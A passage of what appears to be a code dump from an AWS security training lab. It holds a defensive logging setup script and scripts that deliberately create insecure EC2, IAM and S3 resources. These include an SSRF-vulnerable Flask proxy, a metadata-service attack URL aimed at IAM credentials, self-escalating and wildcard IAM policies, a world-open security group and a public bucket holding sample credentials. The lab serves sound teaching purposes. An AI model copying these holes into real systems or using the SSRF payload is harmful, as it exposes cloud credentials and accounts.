    console.print(f"\n[bold cyan]Creating CloudTrail:[/] {trail_name}")
    
    try:
        cloudtrail_client.create_trail(
            Name=trail_name,
            S3BucketName=bucket_name,
            IncludeGlobalServiceEvents=True,
            IsMultiRegionTrail=True,
            EnableLogFileValidation=True,
            TagsList=[
                # {'Key': 'Purpose', 'Value': 'security-monitoring'}, # Duplicate key
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]
        )
        
        # Start logging
        cloudtrail_client.start_logging(Name=trail_name)
        
        console.print(f"  [green]✓[/] CloudTrail created and logging started")
        console.print(f"  [dim]Logs will be stored in: s3://{bucket_name}/[/]")
        return trail_name
        
    except cloudtrail_client.exceptions.TrailAlreadyExistsException:
        console.print(f"  [yellow]! Trail already exists[/]")
        return trail_name
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None


def create_cloudwatch_log_group(logs_client):
    """Create CloudWatch Log Group for centralized logging"""
    log_group = config.CLOUDWATCH_LOG_GROUP
    console.print(f"\n[bold cyan]Creating CloudWatch Log Group:[/] {log_group}")
    
    try:
        logs_client.create_log_group(
            logGroupName=log_group,
            tags={
                # 'Purpose': 'security-lab-logs', # Duplicate key
                **config.COMMON_TAGS
            }
        )
        
        # Set retention to 7 days (for cost savings in lab)
        logs_client.put_retention_policy(
            logGroupName=log_group,
            retentionInDays=7
        )
        
        console.print(f"  [green]✓[/] Log group created with 7-day retention")
        return log_group
        
    except logs_client.exceptions.ResourceAlreadyExistsException:
        console.print(f"  [yellow]! Log group already exists[/]")
        return log_group
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None


def enable_guardduty(guardduty_client):
    """Enable GuardDuty for threat detection"""
    console.print(f"\n[bold cyan]Enabling GuardDuty[/]")
    
    try:
        response = guardduty_client.create_detector(
            Enable=True,
            FindingPublishingFrequency='FIFTEEN_MINUTES',
            Tags={
                'Purpose': 'threat-detection',
                **config.COMMON_TAGS
            }
        )
        
        detector_id = response['DetectorId']
        console.print(f"  [green]✓[/] GuardDuty enabled")
        console.print(f"  [dim]Detector ID: {detector_id}[/]")
        return detector_id
        
    except guardduty_client.exceptions.BadRequestException as e:
        error_msg = str(e).lower()
        if 'already enabled' in error_msg or 'already exists' in error_msg:
            # Get existing detector
            detectors = guardduty_client.list_detectors()
            if detectors['DetectorIds']:
                console.print(f"  [yellow]! GuardDuty already enabled[/]")
                return detectors['DetectorIds'][0]
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None


def create_sns_topic(sns_client):
    """Create SNS topic for security alerts"""
    topic_name = f"{config.LAB_PREFIX}-security-alerts"
    console.print(f"\n[bold cyan]Creating SNS Alert Topic:[/] {topic_name}")
    
    try:
        response = sns_client.create_topic(
            Name=topic_name,
            Tags=[
                # {'Key': 'Purpose', 'Value': 'security-alerts'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]
        )
        
        topic_arn = response['TopicArn']
        console.print(f"  [green]✓[/] SNS topic created")
        console.print(f"  [dim]Topic ARN: {topic_arn}[/]")
        console.print(f"  [yellow]! Subscribe your email to receive alerts[/]")
        return topic_arn
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None


def display_summary(resources):
    """Display summary of created logging resources"""
    table = Table(title="Logging & Detection Resources")
    table.add_column("Service", style="cyan")
    table.add_column("Resource", style="green")
    table.add_column("Purpose", style="yellow")
    
    if resources.get('cloudtrail_bucket'):
        table.add_row("S3", resources['cloudtrail_bucket'], "CloudTrail log storage")
    if resources.get('cloudtrail'):
        table.add_row("CloudTrail", resources['cloudtrail'], "API activity logging")
    if resources.get('log_group'):
        table.add_row("CloudWatch", resources['log_group'], "Centralized logs")
    if resources.get('guardduty'):
        table.add_row("GuardDuty", resources['guardduty'], "Threat detection")
    if resources.get('sns_topic'):
        table.add_row("SNS", resources['sns_topic'], "Security alerts")
    
    console.print("\n")
    console.print(table)


def main():
    console.print(Panel.fit(
        "[bold cyan]📊 LOGGING & DETECTION SETUP 📊[/]\n"
        "This script sets up AWS security monitoring.\n"
        "[green]These are defensive security controls.[/]",
        title="AWS Security Lab"
    ))
    
    # Create clients
    s3_client = boto3.client('s3', region_name=config.AWS_REGION)
    cloudtrail_client = boto3.client('cloudtrail', region_name=config.AWS_REGION)
    logs_client = boto3.client('logs', region_name=config.AWS_REGION)
    guardduty_client = boto3.client('guardduty', region_name=config.AWS_REGION)
    sns_client = boto3.client('sns', region_name=config.AWS_REGION)
    
    account_id = get_account_id()
    console.print(f"\n[dim]AWS Account ID: {account_id}[/]")
    
    resources = {}
    
    # Create logging infrastructure
    resources['cloudtrail_bucket'] = create_cloudtrail_bucket(s3_client, account_id)
    
    if resources['cloudtrail_bucket']:
        resources['cloudtrail'] = create_cloudtrail(cloudtrail_client, resources['cloudtrail_bucket'])
    
    resources['log_group'] = create_cloudwatch_log_group(logs_client)
    resources['guardduty'] = enable_guardduty(guardduty_client)
    resources['sns_topic'] = create_sns_topic(sns_client)
    
    display_summary(resources)
    
    console.print("\n[bold green]Logging setup complete![/]")
    console.print("Monitor security events in: [cyan]soc-defense/log-analysis/[/]")


if __name__ == "__main__":
    main()

```

## File: `infrastructure\setup_vulnerable_ec2.py`
```python
"""
Vulnerable EC2 Setup
====================
Creates intentionally vulnerable EC2 instances and security groups.

VULNERABILITIES CREATED:
1. Security group with all ports open to internet
2. Instance with IMDSv1 (vulnerable to SSRF)
3. Instance with public IP and weak security

WARNING: These are intentionally insecure configurations for educational purposes only!
"""

import boto3
import json
import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


def create_ec2_client():
    """Create boto3 EC2 client and resource"""
    client = boto3.client('ec2', region_name=config.AWS_REGION)
    resource = boto3.resource('ec2', region_name=config.AWS_REGION)
    return client, resource


def get_default_vpc(ec2_client):
    """Get the default VPC ID"""
    response = ec2_client.describe_vpcs(
        Filters=[{'Name': 'isDefault', 'Values': ['true']}]
    )
    if response['Vpcs']:
        return response['Vpcs'][0]['VpcId']
    return None


def get_latest_amazon_linux_ami(ec2_client):
    """Get the latest Amazon Linux 2 AMI ID"""
    response = ec2_client.describe_images(
        Owners=['amazon'],
        Filters=[
            {'Name': 'name', 'Values': ['amzn2-ami-hvm-*-x86_64-gp2']},
            {'Name': 'state', 'Values': ['available']}
        ]
    )
    images = sorted(response['Images'], key=lambda x: x['CreationDate'], reverse=True)
    return images[0]['ImageId'] if images else None


def create_vulnerable_security_group(ec2_client, vpc_id):
    """
    VULNERABILITY 1: Overly Permissive Security Group
    -------------------------------------------------
    Attack Vector: Network-based attacks, unauthorized access
    Risk: All ports open to the entire internet
    """
    sg_name = config.EC2_VULNERABLE_SG
    console.print(f"\n[bold red]Creating VULNERABLE security group:[/] {sg_name}")
    
    try:
        # Check if already exists
        existing = ec2_client.describe_security_groups(
            Filters=[{'Name': 'group-name', 'Values': [sg_name]}]
        )
        if existing['SecurityGroups']:
            console.print(f"  [yellow]! Security group already exists[/]")
            return existing['SecurityGroups'][0]['GroupId']
        
        # Create security group
        response = ec2_client.create_security_group(
            GroupName=sg_name,
            Description='VULNERABLE: All ports open to internet',
            VpcId=vpc_id,
            TagSpecifications=[{
                'ResourceType': 'security-group',
                'Tags': [
                    {'Key': 'Name', 'Value': sg_name},
                    {'Key': 'Vulnerability', 'Value': 'open-to-world'},
                    {'Key': 'Severity', 'Value': 'Critical'},
                    *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
                ]
            }]
        )
        sg_id = response['GroupId']
        
        # VULNERABLE: Allow ALL inbound traffic from anywhere
        ec2_client.authorize_security_group_ingress(
            GroupId=sg_id,
            IpPermissions=[
                {
                    'IpProtocol': '-1',  # VULNERABLE: All protocols
                    'FromPort': -1,
                    'ToPort': -1,
                    'IpRanges': [
                        {
                            'CidrIp': '0.0.0.0/0',  # VULNERABLE: Any IP
                            'Description': 'VULNERABLE: Open to entire internet'
                        }
                    ]
                }
            ]
        )
        
        console.print(f"  [green]✓[/] Created with ALL ports open to 0.0.0.0/0")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Any IP can access any port")
        return sg_id
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None


def create_secure_security_group(ec2_client, vpc_id):
    """
    SECURE REFERENCE SECURITY GROUP
    --------------------------------
    Demonstrates security group best practices
    """
    sg_name = config.EC2_SECURE_SG
    console.print(f"\n[bold green]Creating SECURE security group:[/] {sg_name}")
    
    try:
        existing = ec2_client.describe_security_groups(
            Filters=[{'Name': 'group-name', 'Values': [sg_name]}]
        )
        if existing['SecurityGroups']:
            console.print(f"  [yellow]! Security group already exists[/]")
            return existing['SecurityGroups'][0]['GroupId']
        
        response = ec2_client.create_security_group(
            GroupName=sg_name,
            Description='SECURE: Minimal access with specific IPs',
            VpcId=vpc_id,
            TagSpecifications=[{
                'ResourceType': 'security-group',
                'Tags': [
                    {'Key': 'Name', 'Value': sg_name},
                    {'Key': 'Vulnerability', 'Value': 'none'},
                    # {'Key': 'Purpose', 'Value': 'secure-reference'}, 
                    *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
                ]
            }]
        )
        sg_id = response['GroupId']
        
        # SECURE: Only allow SSH from specific IP (example: your IP)
        # In production, you'd use your actual IP
        ec2_client.authorize_security_group_ingress(
            GroupId=sg_id,
            IpPermissions=[
                {
                    'IpProtocol': 'tcp',
                    'FromPort': 22,
                    'ToPort': 22,
                    'IpRanges': [
                        {
                            'CidrIp': '10.0.0.0/8',  # Internal only
                            'Description': 'SSH from internal network only'
                        }
                    ]
                }
            ]
        )
        
        console.print(f"  [green]✓[/] Created with minimal access rules")
        return sg_id
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None


def create_vulnerable_instance(ec2_client, ec2_resource, sg_id, ami_id):
    """
    VULNERABILITY 2: Vulnerable EC2 Instance
    ----------------------------------------
    Attack Vector: SSRF via IMDSv1, public exposure
    Risk: Credential theft from metadata service
    """
    console.print(f"\n[bold red]Creating VULNERABLE EC2 instance[/]")
    
    try:
        # Get a subnet in the default VPC
        subnets = ec2_client.describe_subnets(
            Filters=[{'Name': 'default-for-az', 'Values': ['true']}]
        )
        if not subnets['Subnets']:
            console.print("  [red]✗ No default subnet found[/]")
            return None
        
        subnet_id = subnets['Subnets'][0]['SubnetId']
        

        # Prepare tags
        instance_tags = [
            {'Key': 'Name', 'Value': f'{config.LAB_PREFIX}-vulnerable-instance'},
            {'Key': 'Vulnerability', 'Value': 'imdsv1-enabled'},
            {'Key': 'Severity', 'Value': 'Critical'}
        ]
        # Add common tags
        for k, v in config.COMMON_TAGS.items():
            instance_tags.append({'Key': k, 'Value': v})

        # Create instance with vulnerable configuration
        # Prepare launch parameters
        launch_params = {
            'ImageId': ami_id,
            'InstanceType': config.EC2_INSTANCE_TYPE,
            'MinCount': 1,
            'MaxCount': 1,
            'SubnetId': subnet_id,
            'SecurityGroupIds': [sg_id],
            'MetadataOptions': {
                'HttpTokens': 'optional',  # VULNERABLE: IMDSv1 allowed
                'HttpEndpoint': 'enabled',
                'HttpPutResponseHopLimit': 2  # VULNERABLE: Allows proxy access
            },
            'TagSpecifications': [{
                'ResourceType': 'instance',
                'Tags': instance_tags
            }],
            'UserData': '''#!/bin/bash
yum update -y
yum install -y python3 python3-pip
pip3 install flask requests

cat << 'EOF' > /home/ec2-user/vulnerable_app.py
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    return "<h1>Vulnerable App</h1><p>Try /proxy?url=http://169.254.169.254/latest/meta-data/</p>"

@app.route('/proxy')
def proxy():
    url = request.args.get('url')
    if url:
        try:
            # VULNERABLE: No filtering on URL, allows access to Metadata Service
            resp = requests.get(url, timeout=2)
            return resp.text
        except Exception as e:
            return str(e)
    return "Missing URL parameter"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF

python3 /home/ec2-user/vulnerable_app.py &
'''
        }

        # Create instance with vulnerable configuration
        instances = ec2_resource.create_instances(**launch_params)
        
        instance = instances[0]
        console.print(f"  [green]✓[/] Created instance: {instance.id}")
        console.print(f"  [yellow]⚠ Vulnerability:[/] IMDSv1 enabled (SSRF risk)")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Running SSRF-vulnerable web app")
        
        return instance.id
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return None


def display_summary(sg_ids, instance_id):
    """Display summary of created resources"""
    table = Table(title="EC2 Resources Created")
    table.add_column("Resource", style="cyan")
    table.add_column("Type", style="blue")
    table.add_column("Vulnerability", style="yellow")
    table.add_column("Severity", style="red")
    
    table.add_row(config.EC2_VULNERABLE_SG, "Security Group", "All Ports Open", "🔴 Critical")
    table.add_row(config.EC2_SECURE_SG, "Security Group", "None (Secure)", "🟢 N/A")
    if instance_id:
        table.add_row(instance_id, "EC2 Instance", "IMDSv1 + SSRF App", "🔴 Critical")
    
    console.print("\n")
    console.print(table)
    
    console.print("\n[bold cyan]SSRF Attack Example:[/]")
    console.print("Once the instance is running, access the web app and try:")
    console.print("[yellow]http://<instance-ip>/fetch?url=http://169.254.169.254/latest/meta-data/[/]")
    console.print("This will expose instance metadata including IAM credentials!")


def main():
    console.print(Panel.fit(
        "[bold red]⚠️  VULNERABLE EC2 SETUP  ⚠️[/]\n"
        "This script creates intentionally insecure EC2 resources.\n"
        "[yellow]For educational purposes only![/]",
        title="AWS Security Lab"
    ))
    
    ec2_client, ec2_resource = create_ec2_client()
    
    # Get default VPC
    vpc_id = get_default_vpc(ec2_client)
    if not vpc_id:
        console.print("[red]✗ No default VPC found. Please create one or modify script.[/]")
        return
    console.print(f"\n[dim]Using VPC: {vpc_id}[/]")
    
    # Get latest AMI
    ami_id = get_latest_amazon_linux_ami(ec2_client)
    if not ami_id:
        console.print("[red]✗ Could not find Amazon Linux AMI[/]")
        return
    console.print(f"[dim]Using AMI: {ami_id}[/]")
    
    # Create resources
    vuln_sg_id = create_vulnerable_security_group(ec2_client, vpc_id)
    secure_sg_id = create_secure_security_group(ec2_client, vpc_id)
    
    instance_id = None
    if vuln_sg_id:
        # Ask before creating instance (costs money)
        console.print("\n[yellow]Note: Creating EC2 instance will incur charges.[/]")
        response = input("Create vulnerable EC2 instance? (y/N): ")
        if response.lower() == 'y':
            instance_id = create_vulnerable_instance(ec2_client, ec2_resource, vuln_sg_id, ami_id)
    
    display_summary({'vulnerable': vuln_sg_id, 'secure': secure_sg_id}, instance_id)
    
    console.print("\n[bold green]Setup complete![/]")
    console.print("Run penetration tests from: [cyan]penetration-testing/ec2-metadata/[/]")


if __name__ == "__main__":
    main()

```

## File: `infrastructure\setup_vulnerable_iam.py`
```python
"""
Vulnerable IAM Setup
====================
Creates intentionally vulnerable IAM users, roles, and policies for security testing.

VULNERABILITIES CREATED:
1. Overly permissive user with admin-like access
2. User that can escalate their own privileges
3. Role with weak trust policy (any principal can assume)
4. Role with wildcard permissions

WARNING: These are intentionally insecure configurations for educational purposes only!
"""

import boto3
import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


def create_iam_client():
    """Create boto3 IAM client"""
    return boto3.client('iam', region_name=config.AWS_REGION)


def get_account_id():
    """Get current AWS account ID"""
    sts = boto3.client('sts')
    return sts.get_caller_identity()['Account']


def create_overprivileged_user(iam_client, account_id):
    """
    VULNERABILITY 1: Overly Permissive User
    ---------------------------------------
    Attack Vector: Privilege abuse, data exfiltration
    Risk: User has excessive permissions beyond their role
    """
    user_name = config.IAM_OVERPRIVILEGED_USER
    console.print(f"\n[bold red]Creating OVERPRIVILEGED user:[/] {user_name}")
    
    try:
        # Create user
        iam_client.create_user(
            UserName=user_name,
            Tags=[
                {'Key': 'Vulnerability', 'Value': 'excessive-permissions'},
                {'Key': 'Severity', 'Value': 'Critical'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]
        )
        
        # VULNERABLE: Extremely broad policy
        overprivileged_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "S3FullAccess",
                    "Effect": "Allow",
                    "Action": "s3:*",  # VULNERABLE: Full S3 access
                    "Resource": "*"
                },
                {
                    "Sid": "IAMDangerousActions",
                    "Effect": "Allow",
                    "Action": [
                        "iam:CreateUser",
                        "iam:CreateAccessKey",
                        "iam:AttachUserPolicy",  # VULNERABLE: Can escalate privileges
                        "iam:PutUserPolicy",
                        "iam:CreateRole",
                        "iam:AttachRolePolicy"
                    ],
                    "Resource": "*"
                },
                {
                    "Sid": "EC2FullAccess",
                    "Effect": "Allow",
                    "Action": "ec2:*",  # VULNERABLE: Full EC2 access
                    "Resource": "*"
                },
                {
                    "Sid": "LambdaFullAccess",
                    "Effect": "Allow",
                    "Action": "lambda:*",  # VULNERABLE: Full Lambda access
                    "Resource": "*"
                }
            ]
        }
        
        iam_client.put_user_policy(
            UserName=user_name,
            PolicyName='overprivileged-policy',
            PolicyDocument=json.dumps(overprivileged_policy)
        )
        
        console.print(f"  [green]✓[/] Created with excessive permissions")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Can access S3, EC2, Lambda, and modify IAM")
        return True
        
    except iam_client.exceptions.EntityAlreadyExistsException:
        console.print(f"  [yellow]! User already exists[/]")
        return True
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def create_escalation_user(iam_client, account_id):
    """
    VULNERABILITY 2: Privilege Escalation Path
    ------------------------------------------
    Attack Vector: Self-escalation via policy attachment
    Risk: User can give themselves admin access
    """
    user_name = config.IAM_ESCALATION_USER
    console.print(f"\n[bold red]Creating ESCALATION user:[/] {user_name}")
    
    try:
        iam_client.create_user(
            UserName=user_name,
            Tags=[
                {'Key': 'Vulnerability', 'Value': 'privilege-escalation'},
                {'Key': 'Severity', 'Value': 'Critical'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]
        )
        
        # VULNERABLE: Can attach policies to self
        escalation_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "ReadOnlyAccess",
                    "Effect": "Allow",
                    "Action": [
                        "s3:GetObject",
                        "s3:ListBucket",
                        "ec2:Describe*"
                    ],
                    "Resource": "*"
                },
                {
                    # VULNERABLE: Can attach ANY policy to themselves
                    "Sid": "AttachPolicyToSelf",
                    "Effect": "Allow",
                    "Action": [
                        "iam:AttachUserPolicy",
                        "iam:PutUserPolicy"
                    ],
                    "Resource": f"arn:aws:iam::{account_id}:user/{user_name}"
                },
                {
                    # VULNERABLE: Can list all policies (reconnaissance)
                    "Sid": "ListPolicies",
                    "Effect": "Allow",
                    "Action": [
                        "iam:ListPolicies",
                        "iam:GetPolicy",
                        "iam:GetPolicyVersion",
                        "iam:ListAttachedUserPolicies",
                        "iam:ListUserPolicies"
                    ],
                    "Resource": "*"
                }
            ]
        }
        
        iam_client.put_user_policy(
            UserName=user_name,
            PolicyName='escalation-vulnerable-policy',
            PolicyDocument=json.dumps(escalation_policy)
        )
        
        console.print(f"  [green]✓[/] Created with self-escalation path")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Can attach AdministratorAccess to self")
        return True
        
    except iam_client.exceptions.EntityAlreadyExistsException:
        console.print(f"  [yellow]! User already exists[/]")
        return True
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def create_weak_trust_role(iam_client, account_id):
    """
    VULNERABILITY 3: Weak Trust Policy
    -----------------------------------
    Attack Vector: Cross-account access abuse
    Risk: Any AWS principal can assume this role
    """
    role_name = config.IAM_WEAK_TRUST_ROLE
    console.print(f"\n[bold red]Creating WEAK TRUST role:[/] {role_name}")
    
    try:
        # VULNERABLE: Any AWS principal can assume
        weak_trust_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "*"  # VULNERABLE: Any AWS account
                    },
                    "Action": "sts:AssumeRole"
                    # Missing: Condition to restrict access
                }
            ]
        }
        
        iam_client.create_role(
            RoleName=role_name,
            AssumeRolePolicyDocument=json.dumps(weak_trust_policy),
            Description='VULNERABLE: Any AWS principal can assume this role',
            Tags=[
                {'Key': 'Vulnerability', 'Value': 'weak-trust-policy'},
                {'Key': 'Severity', 'Value': 'Critical'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]
        )
        
        # Add some permissions to the role
        role_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Action": [
                        "s3:*",
                        "ec2:*"
                    ],
                    "Resource": "*"
                }
            ]
        }
        
        iam_client.put_role_policy(
            RoleName=role_name,
            PolicyName='weak-trust-role-policy',
            PolicyDocument=json.dumps(role_policy)
        )
        
        console.print(f"  [green]✓[/] Created with weak trust policy")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Any AWS account can assume this role")
        return True
        
    except iam_client.exceptions.EntityAlreadyExistsException:
        console.print(f"  [yellow]! Role already exists[/]")
        return True
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def create_wildcard_role(iam_client, account_id):
    """
    VULNERABILITY 4: Wildcard Permissions
    -------------------------------------
    Attack Vector: Unintended resource access
    Risk: Full access to all AWS services
    """
    role_name = config.IAM_WILDCARD_ROLE
    console.print(f"\n[bold red]Creating WILDCARD PERMISSIONS role:[/] {role_name}")
    
    try:
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "ec2.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        }
        
        iam_client.create_role(
            RoleName=role_name,
            AssumeRolePolicyDocument=json.dumps(trust_policy),
            Description='VULNERABLE: Wildcard permissions on all resources',
            Tags=[
                {'Key': 'Vulnerability', 'Value': 'wildcard-permissions'},
                {'Key': 'Severity', 'Value': 'Critical'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]
        )
        
        # VULNERABLE: Full admin-like access
        wildcard_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "DangerousWildcard",
                    "Effect": "Allow",
                    "Action": "*",       # VULNERABLE: All actions
                    "Resource": "*"      # VULNERABLE: All resources
                }
            ]
        }
        
        iam_client.put_role_policy(
            RoleName=role_name,
            PolicyName='wildcard-dangerous-policy',
            PolicyDocument=json.dumps(wildcard_policy)
        )
        
        console.print(f"  [green]✓[/] Created with wildcard permissions")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Has Action:* Resource:* (full access)")
        return True
        
    except iam_client.exceptions.EntityAlreadyExistsException:
        console.print(f"  [yellow]! Role already exists[/]")
        return True
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def create_secure_role(iam_client, account_id):
    """
    SECURE REFERENCE ROLE
    ---------------------
    Demonstrates least-privilege IAM principles
    """
    role_name = config.IAM_SECURE_ROLE
    console.print(f"\n[bold green]Creating SECURE reference role:[/] {role_name}")
    
    try:
        # SECURE: Specific trust with conditions
        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "Service": "ec2.amazonaws.com"
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "aws:SourceAccount": account_id
                        }
                    }
                }
            ]
        }
        
        iam_client.create_role(
            RoleName=role_name,
            AssumeRolePolicyDocument=json.dumps(trust_policy),
            Description='SECURE: Least privilege role for reference',
            Tags=[
                {'Key': 'Vulnerability', 'Value': 'none'},
                {'Key': 'Purpose', 'Value': 'secure-reference'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]
        )
        
        # SECURE: Specific actions on specific resources
        secure_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "LimitedS3Access",
                    "Effect": "Allow",
                    "Action": [
                        "s3:GetObject",
                        "s3:PutObject"
                    ],
                    "Resource": f"arn:aws:s3:::{config.S3_SECURE_BUCKET}/*"
                }
            ]
        }
        
        iam_client.put_role_policy(
            RoleName=role_name,
            PolicyName='secure-least-privilege-policy',
            PolicyDocument=json.dumps(secure_policy)
        )
        
        console.print(f"  [green]✓[/] Created with least-privilege permissions")
        return True
        
    except iam_client.exceptions.EntityAlreadyExistsException:
        console.print(f"  [yellow]! Role already exists[/]")
        return True
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def display_summary(account_id):
    """Display summary of created IAM resources"""
    table = Table(title="IAM Resources Created")
    table.add_column("Resource", style="cyan")
    table.add_column("Type", style="blue")
    table.add_column("Vulnerability", style="yellow")
    table.add_column("Severity", style="red")
    
    table.add_row(config.IAM_OVERPRIVILEGED_USER, "User", "Excessive Permissions", "🔴 Critical")
    table.add_row(config.IAM_ESCALATION_USER, "User", "Self-Escalation", "🔴 Critical")
    table.add_row(config.IAM_WEAK_TRUST_ROLE, "Role", "Weak Trust Policy", "🔴 Critical")
    table.add_row(config.IAM_WILDCARD_ROLE, "Role", "Wildcard Actions", "🔴 Critical")
    table.add_row(config.IAM_SECURE_ROLE, "Role", "None (Secure)", "🟢 N/A")
    
    console.print("\n")
    console.print(table)


def main():
    console.print(Panel.fit(
        "[bold red]⚠️  VULNERABLE IAM SETUP  ⚠️[/]\n"
        "This script creates intentionally insecure IAM resources.\n"
        "[yellow]For educational purposes only![/]",
        title="AWS Security Lab"
    ))
    
    iam_client = create_iam_client()
    account_id = get_account_id()
    
    console.print(f"\n[dim]AWS Account ID: {account_id}[/]")
    
    # Create all IAM resources
    create_overprivileged_user(iam_client, account_id)
    create_escalation_user(iam_client, account_id)
    create_weak_trust_role(iam_client, account_id)
    create_wildcard_role(iam_client, account_id)
    create_secure_role(iam_client, account_id)
    
    display_summary(account_id)
    
    console.print("\n[bold green]Setup complete![/]")
    console.print("Run penetration tests from: [cyan]penetration-testing/iam-escalation/[/]")


if __name__ == "__main__":
    main()

```

## File: `infrastructure\setup_vulnerable_s3.py`
```python
"""
Vulnerable S3 Bucket Setup
==========================
Creates intentionally vulnerable S3 buckets for security testing.

VULNERABILITIES CREATED:
1. Public bucket with open access
2. Bucket without encryption
3. Bucket without versioning
4. Bucket with overly permissive CORS

WARNING: These are intentionally insecure configurations for educational purposes only!
"""

import boto3
import json
import sys
import os

# Add parent directory to path for config import
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel

console = Console()


def create_s3_client():
    """Create boto3 S3 client"""
    return boto3.client('s3', region_name=config.AWS_REGION)


def create_public_bucket(s3_client):
    """
    VULNERABILITY 1: Public S3 Bucket
    ---------------------------------
    Attack Vector: Direct URL access, bucket enumeration
    Risk: Data exposure, sensitive information leakage
    """
    bucket_name = config.S3_PUBLIC_BUCKET
    console.print(f"\n[bold red]Creating PUBLIC bucket:[/] {bucket_name}")
    
    try:
        # Create bucket
        if config.AWS_REGION == 'us-east-1':
            s3_client.create_bucket(Bucket=bucket_name)
        else:
            s3_client.create_bucket(
                Bucket=bucket_name,
                CreateBucketConfiguration={'LocationConstraint': config.AWS_REGION}
            )
        
        # VULNERABLE: Disable all public access blocks
        s3_client.put_public_access_block(
            Bucket=bucket_name,
            PublicAccessBlockConfiguration={
                'BlockPublicAcls': False,       # VULNERABLE
                'IgnorePublicAcls': False,      # VULNERABLE
                'BlockPublicPolicy': False,     # VULNERABLE
                'RestrictPublicBuckets': False  # VULNERABLE
            }
        )
        
        # VULNERABLE: Public read policy
        public_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "PublicReadGetObject",
                    "Effect": "Allow",
                    "Principal": "*",  # VULNERABLE: Anyone can access
                    "Action": ["s3:GetObject", "s3:ListBucket"],
                    "Resource": [
                        f"arn:aws:s3:::{bucket_name}",
                        f"arn:aws:s3:::{bucket_name}/*"
                    ]
                }
            ]
        }
        s3_client.put_bucket_policy(Bucket=bucket_name, Policy=json.dumps(public_policy))
        
        # Add sample "sensitive" files
        s3_client.put_object(
            Bucket=bucket_name,
            Key='backup/credentials.txt',
            Body=config.SAMPLE_CREDENTIALS,
            ContentType='text/plain'
        )
        
        s3_client.put_object(
            Bucket=bucket_name,
            Key='config/app-config.json',
            Body=json.dumps(config.SAMPLE_CONFIG, indent=2),
            ContentType='application/json'
        )
        
        # Add tagging
        s3_client.put_bucket_tagging(
            Bucket=bucket_name,
            Tagging={'TagSet': [
                {'Key': 'Vulnerability', 'Value': 'public-access'},
                {'Key': 'Severity', 'Value': 'Critical'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]}
        )
        
        console.print(f"  [green]✓[/] Created with PUBLIC access")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Anyone can read bucket contents")
        return True
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def create_unencrypted_bucket(s3_client):
    """
    VULNERABILITY 2: No Encryption
    ------------------------------
    Attack Vector: Data interception, compliance violation
    Risk: Data at rest not protected
    """
    bucket_name = config.S3_UNENCRYPTED_BUCKET
    console.print(f"\n[bold red]Creating UNENCRYPTED bucket:[/] {bucket_name}")
    
    try:
        if config.AWS_REGION == 'us-east-1':
            s3_client.create_bucket(Bucket=bucket_name)
        else:
            s3_client.create_bucket(
                Bucket=bucket_name,
                CreateBucketConfiguration={'LocationConstraint': config.AWS_REGION}
            )
        
